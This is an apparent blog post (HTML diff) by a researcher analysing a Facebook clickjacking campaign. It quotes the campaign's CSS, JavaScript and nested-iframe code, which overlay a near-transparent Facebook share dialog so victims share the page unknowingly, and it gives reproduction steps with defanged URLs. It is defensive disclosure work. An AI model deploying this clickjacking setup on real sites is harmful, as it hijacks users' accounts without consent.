@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+        <title>Clickjacking case on facebook</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css" />
+        <link rel="stylesheet" href="./theme/css/main.css" />
+        <link href="http://blog.devsda.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="devsda - blog Full Atom Feed" />
+        <link href="http://blog.devsda.fr/feeds/{slug}.atom.xml" type="application/atom+xml" rel="alternate" title="devsda - blog Categories Atom Feed" />
+</head>
+<body>
+
+    <div class="navigation pure-menu pure-menu-horizontal">
+        <a href="./" class="pure-menu-heading  pure-menu-link">devsda - blog</a>
+        <ul class="pure-menu-list">
+            <li class="pure-menu-item"></li>
+
+            <li class="pure-menu-item"><a href="./category/less-tech.html" class="pure-menu-link">Less tech</a></li>
+            <li class="pure-menu-item pure-menu-selected"><a href="./category/tech.html" class="pure-menu-link">tech</a></li>
+        </ul>
+    </div>
+
+
+<div class="page-container">
+    <div class="entry-content">
+        <div class="post-meta pure-g">
+            <div class="pure-u">
+                <a href="./category/tech.html"><img src="../images/tech.jpg " class="post-avatar" alt="tech"></a>
+            </div>
+<div class="pure-u-3-4 meta-data">
+    <a href="./category/tech.html" class="category">tech</a><br />
+
+    <a class="author" href="./author/devsda.html">devsda</a>
+    &mdash; <abbr title="2019-01-04T22:20:00+01:00">ven. 04 janvier 2019</abbr>
+</div>        </div>
+    </div>
+
+    <div class="article-header-container">
+        <div class="background-image-container">
+
+            <div class="background-image-small">
+                <img src="../images/fb.png" alt="Clickjacking case on facebook">
+                <div class="title-container">
+                    <h1>Clickjacking case on facebook</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="entry-content">
+        <p>Three weeks ago, I ran across some strange publications on facebook, originating from various friends.</p>
+<p><img alt="publication" src="./images/fb_susp_pub.jpg"></p>
+<p>Looking at the domain - s3.amazonaws.com - and the spreading all around my facebook friends - <em>I decided to dig - furthermore.</em></p>
+<h1>TL;DR</h1>
+<p><em>Facebook's share abuse:</em></p>
+<p>A combination of dirty tricks, like CSS opacity and iframe inception, allowed to force an arbitrary user to share some content with its own facebook account - to anyone visiting a website controlled by the attacker.</p>
+<p>Since the malicious action was to "share" the malicious website, the thing quickly started to spread.</p>
+<h1>Report</h1>
+<p>Here's the full report I've made after a good hour of digging. Since the issue has been patched it's no more confidential, I can disclose it right below:</p>
+<div class="highlight"><pre><span></span>               ━━━━━━━━━━━━━━━━━━━━━━━━
+                CLICKJACKING CASE: &quot;SHARE WITH FACEBOOK&quot;
+               ━━━━━━━━━━━━━━━━━━━━━━━━
+
+
+Table of Contents
+─────────────────
+
+1 Security Report
+.. 1.1 Description:
+.. 1.2 Reproducing:
+2 Files analysis
+.. 2.1 files included from &quot;index&quot;
+.. 2.2 less important files or unexplored
+..... 2.2.1 hxxps//s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBEre.html
+..... 2.2.2 hxxps://s3.amazonaws.com/dziadostwoooo/popup/scripts/js.cookie.js
+..... 2.2.3 hxxps://s3.amazonaws.com/dziadostwoooo/popup/scripts/main.js
+
+
+
+
+
+1 Security Report
+═════════════════
+
+1.1 Description:
+────────────────
+
+  While browsing my newsfeed, I noticed a few publications, originating
+  from &#39;s3.amazonaws*&#39; domains.  I decided to take a look, because these
+  publications differs from content usually shared by these people.
+
+  I copied the publication link using &quot;right click&quot; -&gt; &quot;copy link
+  address&quot;, and started digging with `curl` and `wget`. After noticing
+  some very weird looking domains (high entropy, like
+  `s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBEre.html`), and
+  typical clickjacking tricks (css&#39; opacity, iframes), I jumped into the
+  javascript code.
+
+
+  What I&#39;ve found looked nasty, so I attempted using a test account. And
+  It worked - my test account shared a publication without my consent -
+  nothing indicating that I&#39;m actually sharing something to my facebook
+  friends.  This is why I&#39;m filling this security report.
+
+  Actually, the code is not even minimified and quite easy to
+  read. Sadly, I don&#39;t have enough time right know to provide the &quot;full
+  exploit&quot; step by step… but I&#39;ve dumped all the involved code.
+
+  Attached, you&#39;ll find an archive containing:
+  • the frontend code (HTML/Javascript/CSS) involved in this
+    clickjacking setup (directory &#39;statics&#39;)
+  • notes I took during the investigation (notes.txt, with its original
+    org-mode file). In this short memo, I&#39;ve isolated suspicious-looking
+    lines of code, and attempted to describe what&#39;s going on. Because of
+    the multiples domains and file inclusions, it&#39;s not easy to follow
+    without writing things down.
+  • original publication screenshot (publication_screenshot.jpg) in my
+    newsfeed.
+
+
+1.2 Reproducing:
+────────────────
+
+  1. go to
+     hxxps://s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/zPIXitiQPOp6W3.html?vsQj2bGUkS83hkK&amp;fbclid=IwAR0wu0OuGgjb1OhLDl9ghJhoY_leDXVhIPQ_kQU3-aDyOMdfwXZWZS7UN74
+     from an android smartphone (successfully tested with chrome on
+     android, Samsung Galaxy S6)
+  2. A popup asks you (in french) if you are more than 16 year old
+  3. Whatever you &quot;touch/click&quot; on your screen, it will trigger a
+     &quot;share&quot; from any logged-in account. And the cycle continues
+
+  Compatibles victims are checked with the following javascript
+  condition: &quot;(bowser.mobile || bowser.tablet) &amp;&amp; (bowser.android ||
+  bowser.chrome || bowser.msie || bowser.msedge)&quot;
+  (statics/s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBE.js
+  within the archive)
+
+
+2 Files analysis
+════════════════
+
+2.1 files included from &quot;index&quot;
+───────────────────────────────
+
+  /Code is copy/pasted without reformatting/
+
+
+  links have been replaced to avoid misclicks (http-&gt;hxxp)
+
+  Entry point (from facebook) is
+  hxxps://s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/zPIXitiQPOp6W3.html?vsQj2bGUkS83hkK&amp;fbclid=IwAR0wu0OuGgjb1OhLDl9ghJhoY_leDXVhIPQ_kQU3-aDyOMdfwXZWZS7UN74
+  Copied from &quot;right click&quot; -&gt; &quot;copy link address&quot; on some suspicious
+  publication from a friend of mine in facebook.
+
+
+
+  Within the &quot;index&quot;, these lines are interesting:
+
+  ┌────
+  │ 
+  │ &lt;h4&gt;Pour accéder à ce site, vous devez être âgé de 16 ans ou plus.&lt;/h4&gt;
+  │ &lt;h4&gt;Avez-vous plus de 16 ans?&lt;/h4&gt;
+  │ 
+  │         &lt;button type=&quot;submit&quot; name=&quot;submit&quot; class=&quot;btn btn-newsletter&quot; onclick=&quot;top.location.href = &#39;hxxps://s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBEre.html&#39;&quot;&gt;Oui.&lt;/button&gt;
+  │         &lt;iframe class=&quot;d8485i63ikjasdiu73h&quot; id=&quot;d8485i63ikjasdiu73h&quot;  onload=&quot;&quot; scrolling=&quot;no&quot; src=&quot;hxxps://pejzbugpedau.s3.amazonaws.com/iframe.html&quot;&gt;&lt;/iframe&gt;
+  │ 
+  └────
+
+  it also fetchs statics as custom JS and CSS from various aws opaque
+  domains
+
+  A CSS rule applies to /class=&quot;d8485i63ikjasdiu73h&quot;
+  id=&quot;d8485i63ikjasdiu73h&quot;/, located under
+  hxxtp://s3.amazonaws.com/dziadostwoooo/popup/styles/main.css.
+
+
+  ┌────
+  │ .d8485i63ikjasdiu73h {
+  │         width: 100%;
+  │         max-width: 400px;
+  │         border: none;
+  │         opacity: 0.03;
+  │         -webkit-transform: scaleX(200) scaleY(200);
+  │         transform: scaleX(200) scaleY(200);
+  │         margin-top: 8500px;
+  │ }
+  └────
+
+  /hxxps://s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBE.js/
+  also interacts with this element (l.97):
+
+  ┌────
+  │ 
+  │ // Autoshow popup after x seconds
+  │ if (!Cookies.get(&#39;popup-shown&#39;)) {
+  │ 
+  │         // Show 1st time - autoshow
+  │         window.setTimeout(function () {
+  │                 if ((bowser.mobile || bowser.tablet) &amp;&amp; (bowser.android || bowser.chrome || bowser.msie || bowser.msedge)) {
+  │                         gtag(&#39;event&#39;, &#39;wyświetlenie&#39;, {
+  │                                 &#39;event_category&#39; : &#39;viral&#39;,
+  │                                 &#39;event_label&#39; : &#39;&#39;
+  │                         });
+  │ 
+  │                         var myConfObj = {
+  │                                 iframeMouseOver : false
+  │                         }
+  │                         window.addEventListener(&#39;blur&#39;,function(){
+  │                           if(myConfObj.iframeMouseOver){
+  │                                 gtag(&#39;event&#39;, &#39;kliknięcie&#39;, {
+  │                                         &#39;event_category&#39; : &#39;viral&#39;,
+  │                                         &#39;event_label&#39; : &#39;&#39;
+  │                                 });
+  │                                 top.location.href = &#39;hxxps://s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBEre.html&#39;;
+  │ 
+  │                           }
+  │                         });
+  │ 
+  │                         document.getElementById(&#39;d8485i63ikjasdiu73h&#39;).addEventListener(&#39;touchstart&#39;,function(){
+  │                            myConfObj.iframeMouseOver = true;
+  │                         });
+  │                         document.getElementById(&#39;d8485i63ikjasdiu73h&#39;).addEventListener(&#39;mouseover&#39;,function(){
+  │                            myConfObj.iframeMouseOver = true;
+  │                         });
+  │                         document.getElementById(&#39;d8485i63ikjasdiu73h&#39;).addEventListener(&#39;touchend&#39;,function(){
+  │                                 myConfObj.iframeMouseOver = false;
+  │                         });
+  │                         document.getElementById(&#39;d8485i63ikjasdiu73h&#39;).addEventListener(&#39;mouseout&#39;,function(){
+  │                                 myConfObj.iframeMouseOver = false;
+  │                         });
+  │ 
+  │                 } else{
+  │                         (document.getElementById(&quot;d8485i63ikjasdiu73h&quot;)).remove();
+  │                 }
+  │                 show();
+  │         }, 2000);
+  │ 
+  │         // Show 2nd time - on exit
+  │         $(document).on(&#39;mousemove&#39;, function (e) {
+  │                 if (e.pageY - $(document).scrollTop() &lt;= 20 &amp;&amp; previousY &gt; e.pageY &amp;&amp; !isExitPopupShown) {
+  │                         show();
+  │                         isExitPopupShown = true;
+  │                 }
+  │ 
+  │                 previousY = e.pageY;
+  │         });
+  │ }
+  │ 
+  └────
+
+
+  Here&#39;s the content of our iframe, fetch from
+  /hxxps://pejzbugpedau.s3.amazonaws.com/iframe.html/
+
+  ┌────
+  │ &lt;style&gt;
+  │                 .cookie_frame {
+  │                                                 width: 100%;
+  │                                                 border: none;
+  │                                                 }
+  │                 &lt;/style&gt;
+  │                 &lt;iframe class=&quot;cookie_frame&quot; id=&quot;cookie_frame&quot; onload=&quot;&quot; scrolling=&quot;no&quot; src=&quot;hxxps://pejzbugpedau.s3.amazonaws.com/UE8jnrzxB1JIQ7c0TYHmZN9l.html&quot;&gt;&lt;/iframe&gt;
+  └────
+
+
+  oh, this creates a new /iframe/ witch content fetched from
+  /hxxps://pejzbugpedau.s3.amazonaws.com/UE8jnrzxB1JIQ7c0TYHmZN9l.html/.
+
+  /It looks like this code actually share the viral content, in a pretty
+  strange way, into an iframe within an iframe which opacity is 0.03/ 🤔
+
+  ┌────
+  │ &lt;html&gt;&lt;body&gt;&lt;iframe style=&quot;margin-top: -300;width: 100%;height: 340px;&quot; id=&quot;tenframe&quot; src=&quot;hxxps://mobile.facebook.com/v2.6/dialog/share?app_id=350685531728&amp;href=hxxps://s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/WZSGtHRmVIqvD.html?PUprfLl5CV
+  │ &amp;in_iframe=1&amp;locale=en_US&amp;mobile_iframe=1&quot; scrolling=&quot;no&quot;&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;
+  └────
+
+
+  I&#39;m not sure these are malicious, but wow, this is the most
+  complicated way of doing a facebook share I&#39;ve seen in my life.
+
+  Edit: This is definitely some Clickjacking, reproduced
+
+
+2.2 less important files or unexplored
+──────────────────────────────────────
+
+2.2.1 hxxps//s3.amazonaws.com/k57c18j5fvrp1d6xuhpxq07ws/QkvX5KS9SMBEre.html
+╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
+
+  ┌────
+  │ &lt;script&gt;
+  │ top.location.href = &quot;http://bit.ly/2L3Chw0&quot;;
+  │ &lt;/script&gt;
+  └────
+
+  • leads to [http://bit.ly/2L3Chw0]
+  • that leads to highfives.space/ (wordpress behind cloudflare)
+    (highfives.space/post/a-quoi-ressemble-la-vie-avant-et-apres-vos-30-ans/)
+
+  which himself includes a lot of stuff.
+
+
+2.2.2 hxxps://s3.amazonaws.com/dziadostwoooo/popup/scripts/js.cookie.js
+╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
+
+  Looks like a generic cookie javascript library
+
+
+2.2.3 hxxps://s3.amazonaws.com/dziadostwoooo/popup/scripts/main.js
+╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌
+
+  ┌────
+  │ $(function () {
+  │ 
+  │         // Initialize Popup
+  │         Popup.init({
+  │                 popupOverlayEl: $(&#39;.popup-overlay&#39;),
+  │                 popupEl: $(&#39;.popup&#39;),
+  │                 closeEl: $(&#39;.popup&#39;).find(&#39;.close&#39;),
+  │                 errorMsgEl: $(&#39;.popup&#39;).find(&#39;.validation-errors&#39;)
+  │         });
+  │ });
+  └────
+</pre></div>
+
+
+<p>Like I said, I've dumped each piece of HTML/JS/CSS involved in this "attack", email me at <code>slashdevsda⦦  ⦦gmail⦦dot⦦com</code> if you are interested. </p>
+<p>During the process, I discovered <code>wget -np -lp -r &lt;url&gt;</code>. 
+This command is awesome for these purposes - copying a whole website locally, by following links. In a manner of minutes, you could copy an entire platform for local analysis.
+Each argument (<code>-r</code>, <code>-lp</code>, <code>-np</code>) is explained within <code>man wget</code>.</p>
+<hr>
+<p>I won't receive any reward, but that's not an issue. I just wanted to have fun - <em>I did.</em></p>
+<p>The guy from facebook's security told me that the "issue has already been reported" - this is what I've hoped for, because the flaw was already massively exploited. Still wondering how this could happen, since Facebook is very opaque about its own security.</p>
+<p>Cheers.</p>
+    </div>
+
+    <footer>
+        <div class="tags">
+            <a href="./tag/infosec.html">infosec</a>
+            <a href="./tag/bug.html">bug</a>
+        </div>
+        <div class="pure-g post-footer">
+            <div class="pure-u-1 pure-u-md-1-2">
+                <div class="pure-g poster-info">
+                    <div class="pure-u-3-4">
+                        <h3 class="author-name"><a href="./author/devsda.html">devsda</a></h3>
+                        <p class="author-description">
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+
+            <div class="pure-u-1 pure-u-md-1-2">
+
+                <div class="pure-g post-category-info">
+                    <div class="pure-u">
+                        <a href="./category/tech.html"><img src="../images/tech.jpg" alt=""></a>
+                    </div>
+                    <div class="pure-u-3-4">
+                        <h3 class="author-name"><a href="./category/tech.html">tech</a></h3>
+                        <p class="author-description">
+                          Tech/code related stuff
+                        </p>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+
+
+    </footer>
+
+    <div class="entry-content">
+        <div id="disqus_thread"></div>
+        <script type="text/javascript">
+            var disqus_shortname = 'devsda';
+            (function() {
+                var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+            })();
+        </script>
+        <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+    </div>
+
+</div>
+
+
+
+    <footer class="index-footer">
+
+        <a href="./" title="devsda - blog">devsda - blog</a>
+        <a href="./category/less-tech.html">Less tech</a>
+        <a href="./category/tech.html">tech</a>
+        <a href="http://getpelican.com/">Pelican</a>
+        <a href="http://python.org/">Python.org</a>
+        <a href="https://www.laquadrature.net/fr">La Quadrature du Net</a>
+
+    </footer>
+
+</body>
+</html>
